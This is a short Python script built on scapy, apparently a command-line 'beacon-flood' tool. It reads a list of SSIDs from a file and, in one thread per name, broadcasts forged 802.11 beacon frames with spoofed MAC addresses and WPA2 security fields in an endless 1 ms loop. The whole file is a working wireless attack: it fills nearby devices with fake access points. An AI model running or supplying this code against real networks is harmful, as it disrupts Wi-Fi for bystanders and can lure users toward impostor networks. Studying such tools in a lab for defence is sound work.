from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump
import sys, os, binascii, threading

class BeaconFlood():
    def __init__(self, dst_mac_addr = 'ff:ff:ff:ff:ff:ff', src_mac_addr = '11:11:11:11:11:11', ap_mac_addr = '22:22:22:22:22:22', threads = 1):
        self.ssid = None
        self.dst_mac_addr = dst_mac_addr
        self.src_mac_addr = src_mac_addr
        self.ap_mac_addr = ap_mac_addr
        self.threads = threads

    def usage(self):
        if len(sys.argv) != 3:
            print("syntax : beacon-flood <interface> <ssid-list-file>")
            print("sample : beacon-flood mon0 ssid-list.txt")
            sys.exit()    

    def read_ssid_from_txt(self):
        with open(sys.argv[2], 'rt') as fp:
            self.ssid = fp.readlines()
            self.ssid = list(map(lambda s:s.strip(), self.ssid))
        print(f'[+] ssid list read: {self.ssid}')

    def send_fake_ssid_beacon(self, fake_ssid, interval):
        dot11 = Dot11(type=0, subtype=8, addr1=self.dst_mac_addr , addr2 =self.src_mac_addr, addr3 =self.ap_mac_addr)
        beacon = Dot11Beacon(cap='ESS+privacy')
        ressid = Dot11Elt(ID='SSID', info=fake_ssid, len=len(fake_ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'
            '\x00\x0f\xac\x02'
            '\x02\x00'
            '\x00\x0f\xac\x04'
            '\x00\x0f\xac\x02'
            '\x01\x00'
            '\x00\x0f\xac\x02'
            '\x00\x00'))
        frame = RadioTap()/dot11/beacon/ressid/rsn
        sendp(frame, iface=sys.argv[1], inter=interval, loop=1)

    def start(self, interval=0.001):
        for fake_ssid in self.ssid:
            t = threading.Thread(target=self.send_fake_ssid_beacon, args = (fake_ssid, interval))
            t.start()


if __name__ == "__main__":
    beacon_flood = BeaconFlood('ff:ff:ff:ff:ff:ff', '11:11:11:11:11:11', '22:22:22:22:22:22')
    beacon_flood.usage()
    beacon_flood.read_ssid_from_txt()
    beacon_flood.start(0.001)
    
